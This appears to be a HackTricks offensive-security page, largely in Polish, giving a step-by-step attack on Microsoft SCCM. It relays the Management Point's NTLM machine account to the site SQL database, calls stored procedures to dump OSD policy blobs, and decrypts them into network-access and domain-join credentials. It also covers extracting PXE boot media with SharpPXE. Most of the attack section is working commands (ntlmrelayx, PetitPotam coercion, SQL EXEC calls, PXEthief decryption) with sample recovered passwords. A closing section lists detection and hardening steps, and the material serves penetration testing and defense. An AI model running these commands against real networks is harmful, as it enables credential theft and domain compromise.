# SCCM Management Point NTLM Relay to SQL – OSD Policy Secret Extraction

{{#include ../../banners/hacktricks-training.md}}

## TL;DR
Zmuszając **System Center Configuration Manager (SCCM) Management Point (MP)** do uwierzytelnienia się przez SMB/RPC i **relaying** tego konta maszyny NTLM do **site database (MSSQL)** uzyskujesz prawa `smsdbrole_MP` / `smsdbrole_MPUserSvc`. Role te pozwalają wywoływać zestaw procedur składowanych, które ujawniają **Operating System Deployment (OSD)** policy blobs (Network Access Account credentials, Task-Sequence variables, itd.). Bloby są zakodowane heksadecymalnie / zaszyfrowane, ale można je zdekodować i odszyfrować za pomocą **PXEthief**, uzyskując jawne sekrety.

Schemat wysokiego poziomu:
1. Odkryj MP & site DB ↦ nieautoryzowany endpoint HTTP `/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA`.
2. Start `ntlmrelayx.py -t mssql://<SiteDB> -ts -socks`.
3. Coerce MP using **PetitPotam**, PrinterBug, DFSCoerce, etc.
4. Poprzez proxy SOCKS połącz się z `mssqlclient.py -windows-auth` jako przekazane konto **<DOMAIN>\\<MP-host>$**.
5. Wykonaj:
* `use CM_<SiteCode>`
* `exec MP_GetMachinePolicyAssignments N'<UnknownComputerGUID>',N''`
* `exec MP_GetPolicyBody N'<PolicyID>',N'<Version>'`   (or `MP_GetPolicyBodyAfterAuthorization`)
6. Usuń `0xFFFE` BOM, `xxd -r -p` → XML  → `python3 pxethief.py 7 <hex>`.

Sekrety takie jak `OSDJoinAccount/OSDJoinPassword`, `NetworkAccessUsername/Password` itd. są odzyskiwane bez ingerencji w PXE ani klientów.

---

## 1. Enumerating unauthenticated MP endpoints
Rozszerzenie ISAPI MP **GetAuth.dll** udostępnia kilka parametrów, które nie wymagają uwierzytelnienia (chyba że site jest PKI-only):

| Parametr | Cel |
|-----------|---------|
| `MPKEYINFORMATIONMEDIA` | Zwraca site signing cert public key + GUIDy urządzeń *x86* / *x64* **All Unknown Computers**. |
| `MPLIST` | Wymienia wszystkie Management-Point w site. |
| `SITESIGNCERT` | Zwraca Primary-Site signing certificate (pozwala zidentyfikować serwer site bez LDAP). |

Zdobądź GUIDy, które będą działać jako **clientID** dla późniejszych zapytań do bazy danych:
```bash
curl http://MP01.contoso.local/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA | xmllint --format -
```
---

## 2. Przekaż konto komputera MP do MSSQL
```bash
# 1. Start the relay listener (SMB→TDS)
ntlmrelayx.py -ts -t mssql://10.10.10.15 -socks -smb2support

# 2. Trigger authentication from the MP (PetitPotam example)
python3 PetitPotam.py 10.10.10.20 10.10.10.99 \
-u alice -p P@ssw0rd! -d CONTOSO -dc-ip 10.10.10.10
```
Gdy coercion się uruchomi, powinieneś zobaczyć coś takiego:
```
[*] Authenticating against mssql://10.10.10.15 as CONTOSO/MP01$ SUCCEED
[*] SOCKS: Adding CONTOSO/MP01$@10.10.10.15(1433)
```
---

## 3. Zidentyfikuj polityki OSD za pomocą procedur składowanych
Połącz się przez SOCKS proxy (domyślnie port 1080):
```bash
proxychains mssqlclient.py CONTOSO/MP01$@10.10.10.15 -windows-auth
```
Przełącz się na bazę danych **CM_<SiteCode>** (użyj 3-cyfrowego kodu site, np. `CM_001`).

### 3.1  Znajdź Unknown-Computer GUIDs (opcjonalnie)
```sql
USE CM_001;
SELECT SMS_Unique_Identifier0
FROM dbo.UnknownSystem_DISC
WHERE DiscArchKey = 2; -- 2 = x64, 0 = x86
```
### 3.2  Wyświetl przypisane polityki
```sql
EXEC MP_GetMachinePolicyAssignments N'e9cd8c06-cc50-4b05-a4b2-9c9b5a51bbe7', N'';
```
Każdy wiersz zawiera `PolicyAssignmentID`, `Body` (hex), `PolicyID`, `PolicyVersion`.

Skoncentruj się na politykach:
* **NAAConfig**  – poświadczenia konta Network Access
* **TS_Sequence** – zmienne Task Sequence (OSDJoinAccount/Password)
* **CollectionSettings** – Może zawierać konta run-as

### 3.3  Pobierz pełne Body
Jeśli już posiadasz `PolicyID` i `PolicyVersion`, możesz pominąć wymaganie clientID używając:
```sql
EXEC MP_GetPolicyBody N'{083afd7a-b0be-4756-a4ce-c31825050325}', N'2.00';
```
> WAŻNE: W SSMS zwiększ “Maximum Characters Retrieved” (>65535) albo blob zostanie obcięty.

---

## 4. Dekoduj i odszyfruj blob
```bash
# Remove the UTF-16 BOM, convert from hex → XML
echo 'fffe3c003f0078…' | xxd -r -p > policy.xml

# Decrypt with PXEthief (7 = decrypt attribute value)
python3 pxethief.py 7 $(xmlstarlet sel -t -v "//value/text()" policy.xml)
```
Przykład odzyskanych sekretów:
```
OSDJoinAccount : CONTOSO\\joiner
OSDJoinPassword: SuperSecret2025!
NetworkAccessUsername: CONTOSO\\SCCM_NAA
NetworkAccessPassword: P4ssw0rd123
```
---

## 5. Istotne role i procedury SQL
W wyniku relay login jest mapowany na:
* `smsdbrole_MP`
* `smsdbrole_MPUserSvc`

Role te udostępniają dziesiątki uprawnień EXEC; kluczowe, używane w tym ataku, to:

| Procedura składowana | Cel |
|---------------------|-----|
| `MP_GetMachinePolicyAssignments` | Wypisuje polityki przypisane do `clientID`. |
| `MP_GetPolicyBody` / `MP_GetPolicyBodyAfterAuthorization` | Zwraca pełną treść polityki. |
| `MP_GetListOfMPsInSiteOSD` | Zwracana przez ścieżkę `MPKEYINFORMATIONMEDIA`. |

Pełną listę możesz sprawdzić za pomocą:
```sql
SELECT pr.name
FROM   sys.database_principals AS dp
JOIN   sys.database_permissions AS pe ON pe.grantee_principal_id = dp.principal_id
JOIN   sys.objects AS pr ON pr.object_id = pe.major_id
WHERE  dp.name IN ('smsdbrole_MP','smsdbrole_MPUserSvc')
AND  pe.permission_name='EXECUTE';
```
---

## 6. Pozyskiwanie mediów rozruchowych PXE (SharpPXE)
* **PXE reply over UDP/4011**: wyślij żądanie rozruchu PXE do Distribution Point skonfigurowanego dla PXE. Odpowiedź proxyDHCP ujawnia ścieżki rozruchowe takie jak `SMSBoot\\x64\\pxe\\variables.dat` (zaszyfrowana konfiguracja) i `SMSBoot\\x64\\pxe\\boot.bcd`, oraz opcjonalny zaszyfrowany blob klucza.
* **Retrieve boot artifacts via TFTP**: użyj zwróconych ścieżek do pobrania `variables.dat` przez TFTP (bez uwierzytelnienia). Plik jest mały (kilka KB) i zawiera zaszyfrowane zmienne mediów.
* **Odszyfruj lub złam**:
- Jeśli odpowiedź zawiera klucz deszyfrujący, podaj go do **SharpPXE**, aby odszyfrować `variables.dat` bezpośrednio.
- Jeśli klucz nie jest dostarczony (PXE media chronione niestandardowym hasłem), SharpPXE generuje **Hashcat-compatible** `$sccm$aes128$...` hash do łamania offline. Po odzyskaniu hasła odszyfruj plik.
* **Parse decrypted XML**: odszyfrowane zmienne w postaci tekstu jawnego zawierają metadane wdrożenia SCCM (**Management Point URL**, **Site Code**, GUIDy mediów i inne identyfikatory). SharpPXE je parsuje i wypisuje gotowe do uruchomienia polecenie **SharpSCCM** z wstępnie wypełnionymi parametrami GUID/PFX/site do dalszego nadużycia.
* **Wymagania**: jedynie łączność sieciowa do nasłuchu PXE (UDP/4011) i TFTP; nie są potrzebne uprawnienia administratora lokalnego.

---

## 7. Wykrywanie i utwardzanie
1. **Monitor MP logins** – każde konto komputera MP logujące się z IP, które nie jest jego hostem ≈ relay.
2. Włącz **Extended Protection for Authentication (EPA)** na bazie danych site (`PREVENT-14`).
3. Wyłącz nieużywane NTLM, wymuś SMB signing, ogranicz RPC (te same mitigacje stosowane przeciwko `PetitPotam`/`PrinterBug`).
4. Wzmocnij komunikację MP ↔ DB za pomocą IPSec / mutual-TLS.
5. **Constrain PXE exposure** – ogranicz UDP/4011 i TFTP do zaufanych VLANów, wymagaj haseł PXE i alertuj na pobrania TFTP `SMSBoot\\*\\pxe\\variables.dat`.

---

## Zobacz też
* Podstawy NTLM relay:

{{#ref}}
../ntlm/README.md
{{#endref}}

* Nadużycie MSSQL i post-exploitation:

{{#ref}}
abusing-ad-mssql.md
{{#endref}}



## References
- [I’d Like to Speak to Your Manager: Stealing Secrets with Management Point Relays](https://specterops.io/blog/2025/07/15/id-like-to-speak-to-your-manager-stealing-secrets-with-management-point-relays/)
- [PXEthief](https://github.com/MWR-CyberSec/PXEThief)
- [Misconfiguration Manager – ELEVATE-4 & ELEVATE-5](https://github.com/subat0mik/Misconfiguration-Manager)
- [SharpPXE](https://github.com/leftp/SharpPXE)
{{#include ../../banners/hacktricks-training.md}}
